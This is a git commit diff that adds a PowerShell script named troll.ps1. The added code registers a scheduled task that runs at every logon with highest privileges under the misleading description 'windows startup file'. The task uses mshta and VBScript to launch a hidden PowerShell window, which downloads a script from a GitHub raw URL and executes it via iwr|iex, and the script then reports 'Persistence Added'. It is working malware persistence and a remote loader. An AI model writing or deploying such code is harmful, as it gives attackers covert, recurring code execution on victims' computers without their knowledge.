d445ae9350e7b9d79be3db7b0dea5e0d03636d48
43a1723 <hai1723notgay@gmail.com>
2025-02-04 20:59:22 +0700

    Update troll.ps1

--- troll.ps1
+++ troll.ps1
@@ -1,1 +1,6 @@
-
+$task_name = "haha"
+$task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `iwr('https://raw.githubusercontent.com/43a1723/funny/refs/heads/main/troll.ps1')|iex`",0)(window.close)"
+$task_trigger = New-ScheduledTaskTrigger -AtLogOn
+$task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
+Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "windows startup file" -RunLevel Highest -Force
+Write-Host "[!] Persistence Added" -ForegroundColor Green
